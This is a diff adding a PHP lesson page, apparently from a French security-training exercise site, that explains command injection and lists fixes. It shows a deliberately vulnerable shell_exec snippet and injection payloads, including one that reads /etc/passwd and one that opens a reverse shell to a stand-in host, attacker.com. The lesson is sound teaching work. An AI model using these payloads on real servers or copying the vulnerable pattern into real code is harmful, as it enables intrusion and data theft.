@@ -1,0 +1,139 @@
+<?php
+
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    header('Location: login.php');
+    exit;
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Injection Vulnerabilities</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: "Inter", sans-serif;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+
+        .vuln-title {
+            margin-top: 30px;
+            font-size: 1.5rem;
+            color: #007bff;
+        }
+
+        .example-code {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        .patch-section {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #28a745;
+            border-radius: 5px;
+            background-color: #e9f7ef;
+        }
+
+        .alert {
+            color: red;
+            font-weight: bold;
+        }
+
+        .home_container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 10px;
+        }
+
+        .home_container img {
+            width: 50px;
+            height: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="home_container">
+        <img id="homeImage" src="../img/accueil.png" alt="Accueil"
+            onclick="window.location.href='../index_exercices.php'">
+    </div>
+    <div class="container">
+        <h1 class="text-center mb-4">Comprendre la Command Injection</h1>
+
+        <div class="vuln-title">1. Qu'est-ce qu'une Command Injection ?</div>
+        <br>
+        <p>La Command Injection est une faille qui permet à un attaquant d'exécuter des commandes système arbitraires
+            sur un serveur vulnérable.</p>
+
+        <div class="vuln-title">2. Exemple de code vulnérable</div>
+        <div class="example-code">
+            <pre><code>
+if (isset($_GET['ip'])) {
+    $ip = $_GET['ip'];
+    echo shell_exec("ping -c 4 " . $ip);
+}
+            </code></pre>
+        </div>
+        <br>
+        <p>Si l'utilisateur saisit <code>127.0.0.1</code>, la commande devient : <code>ping -c 4 127.0.0.1</code>. Mais
+            un attaquant peut injecter une commande malveillante :</p>
+        <div class="example-code">
+            <pre><code>http://example.com/index.php?ip=127.0.0.1; cat /etc/passwd</code></pre>
+        </div>
+
+        <div class="vuln-title">3. Exploitation</div>
+        <p>Voici quelques techniques d'injection :</p>
+        <div class="example-code">
+            <pre><code>
+127.0.0.1; ls -la
+127.0.0.1 && whoami
+127.0.0.1 | nc attacker.com 4444 -e /bin/bash
+            </code></pre>
+        </div>
+        <p>Plus d'exemples d'attaques : <a
+                href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+                target="_blank">PayloadAllTheThings</a></p>
+
+        <div class="patch-section">
+            <strong>Patch:</strong>
+            <ul>
+                <li>Éviter d'utiliser <code>shell_exec</code>, <code>exec</code>, <code>system</code> avec des entrées
+                    utilisateur.</li>
+                <li>Utiliser des fonctions sécurisées comme <code>escapeshellarg()</code> et
+                    <code>escapeshellcmd()</code>.
+                </li>
+                <li>Mettre en place une liste blanche des entrées autorisées.</li>
+            </ul>
+        </div>
+        <div class="text-center mt-5">
+            <button type="button" class="btn btn-primary"
+                onclick="window.location.href='../qcm/qcm_command.php'">QCM</button>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
